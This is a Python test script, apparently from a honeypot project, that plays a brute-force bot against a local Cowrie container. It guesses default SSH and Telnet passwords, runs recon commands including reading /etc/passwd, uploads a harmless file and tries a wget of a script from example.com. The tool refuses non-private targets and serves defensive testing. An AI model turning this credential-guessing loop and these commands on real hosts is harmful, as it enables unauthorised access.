"""Scripted attack traffic against a LOCAL Cowrie container, for end-to-end tests.

Plays the part of a dumb brute-force bot: guesses credentials over SSH and
Telnet, runs recon commands after getting in, uploads one harmless file over
SFTP, and tries a wget (which should fail once the egress lock is on).

Only ever point this at your own honeypot:
    python tools/simulate_attacks.py --host 127.0.0.1 --ssh-port 2222 --telnet-port 2323
"""

from __future__ import annotations

import argparse
import io
import ipaddress
import random
import socket
import sys
import time

import paramiko

CREDS = [
    ("root", "root"), ("root", "123456"), ("admin", "admin"), ("user", "user"),
    ("test", "test123"), ("ubuntu", "ubuntu"), ("oracle", "oracle"), ("root", "toor"),
    ("root", "P@ssw0rd"), ("admin", "admin123"), ("pi", "raspberry"), ("ubuntu", "qwerty"),
]
COMMANDS = [
    "uname -a",
    "cat /proc/cpuinfo | grep name | wc -l",
    "free -m | grep Mem",
    "w",
    "ls -la /tmp",
    "cd /tmp && wget http://example.com/local-test.sh",
    "cat /etc/passwd | head -3",
    "crontab -l",
]
TEST_PAYLOAD = b"#!/bin/sh\n# harmless local test file for the honeypot pipeline\necho hello\n"


def ssh_session(host: str, port: int, user: str, password: str, run: list[str],
                upload: bool) -> str:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # it is a honeypot
    try:
        client.connect(host, port=port, username=user, password=password, timeout=10,
                       allow_agent=False, look_for_keys=False, banner_timeout=10,
                       auth_timeout=10)
    except paramiko.AuthenticationException:
        return "auth-failed"
    try:
        if upload:
            sftp = client.open_sftp()
            sftp.putfo(io.BytesIO(TEST_PAYLOAD), "/tmp/.local-test")
            sftp.close()
        # Interactive shell, one line at a time: Cowrie ends the connection when an
        # exec channel closes, and most bots drive a shell like this anyway.
        chan = client.invoke_shell()
        chan.settimeout(10)
        _drain(chan)
        for cmd in run:
            chan.send(cmd + "\n")
            _drain(chan)
        chan.send("exit\n")
        return "ok"
    finally:
        client.close()


def _drain(chan: paramiko.Channel, timeout: float = 6) -> bytes:
    """Read shell output until the prompt comes back (or the timeout passes)."""
    buf = b""
    end = time.time() + timeout
    while time.time() < end:
        if chan.recv_ready():
            buf += chan.recv(4096)
            if buf.rstrip().endswith((b"#", b"$")):
                break
        else:
            time.sleep(0.05)
    return buf


def _read_until(sock: socket.socket, needles: tuple[bytes, ...], timeout: float = 8) -> bytes:
    sock.settimeout(timeout)
    buf = b""
    end = time.time() + timeout
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        # Refuse every telnet option negotiation (IAC DO/WILL x -> IAC WONT/DONT x).
        out = bytearray()
        i = 0
        while i < len(chunk):
            if chunk[i] == 255 and i + 2 < len(chunk) and chunk[i + 1] in (251, 252, 253, 254):
                verb = {251: 254, 252: 254, 253: 252, 254: 252}[chunk[i + 1]]
                sock.sendall(bytes([255, verb, chunk[i + 2]]))
                i += 3
                continue
            out.append(chunk[i])
            i += 1
        buf += bytes(out)
        if any(n in buf.lower() for n in needles):
            break
    return buf


def telnet_session(host: str, port: int, user: str, password: str, run: list[str]) -> str:
    with socket.create_connection((host, port), timeout=10) as s:
        _read_until(s, (b"login:",))
        s.sendall(user.encode() + b"\r\n")
        _read_until(s, (b"password:",))
        s.sendall(password.encode() + b"\r\n")
        reply = _read_until(s, (b"#", b"$", b"incorrect", b"login:"))
        if b"#" not in reply and b"$" not in reply:
            return "auth-failed"
        for cmd in run:
            s.sendall(cmd.encode() + b"\r\n")
            _read_until(s, (b"#", b"$"), timeout=4)
        s.sendall(b"exit\r\n")
        return "ok"


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--ssh-port", type=int, default=2222)
    ap.add_argument("--telnet-port", type=int, default=2323)
    ap.add_argument("--rounds", type=int, default=12)
    ap.add_argument("--seed", type=int, default=7)
    args = ap.parse_args()

    # Guard rail: this is for your own local honeypot, not other people's machines.
    if not ipaddress.ip_address(socket.gethostbyname(args.host)).is_private:
        print("refusing: target must be a private/loopback address", file=sys.stderr)
        return 2

    rng = random.Random(args.seed)
    results = {"ssh-ok": 0, "ssh-auth-failed": 0, "telnet-ok": 0, "telnet-auth-failed": 0}
    for i in range(args.rounds):
        user, pw = rng.choice(CREDS)
        cmds = rng.sample(COMMANDS, k=rng.randint(2, 5))
        r = ssh_session(args.host, args.ssh_port, user, pw, cmds, upload=(i == 0))
        results[f"ssh-{r}"] += 1
        user, pw = rng.choice(CREDS)
        r = telnet_session(args.host, args.telnet_port, user, pw, cmds[:3])
        results[f"telnet-{r}"] += 1
        print(f"round {i + 1}/{args.rounds}: {results}")
    # Make sure at least one guaranteed-good login per protocol happened.
    ssh_session(args.host, args.ssh_port, "root", "hunter2", COMMANDS, upload=True)
    telnet_session(args.host, args.telnet_port, "root", "hunter2", COMMANDS[:4])
    print("done:", results)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
